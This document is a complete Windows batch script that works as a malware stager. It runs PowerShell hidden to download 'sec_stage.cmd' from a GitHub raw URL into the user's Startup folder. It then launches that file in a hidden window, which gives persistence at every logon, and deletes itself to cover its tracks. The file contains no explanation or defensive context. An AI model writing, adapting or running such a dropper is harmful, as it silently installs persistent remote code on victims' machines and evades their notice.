@echo off

SET stage_path="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
SET init_path=%cd%

powershell -windowstyle hidden -c "Invoke-WebRequest 'raw.githubusercontent.com/DomoKrch/experiments/main/sec_stage.cmd' -OutFile '%stage_path%/sec_stage.cmd'"

powershell -c "Start-Process -FilePath '%stage_path%\sec_stage.cmd' -WindowStyle Hidden"

cd %init_path%
DEL %0
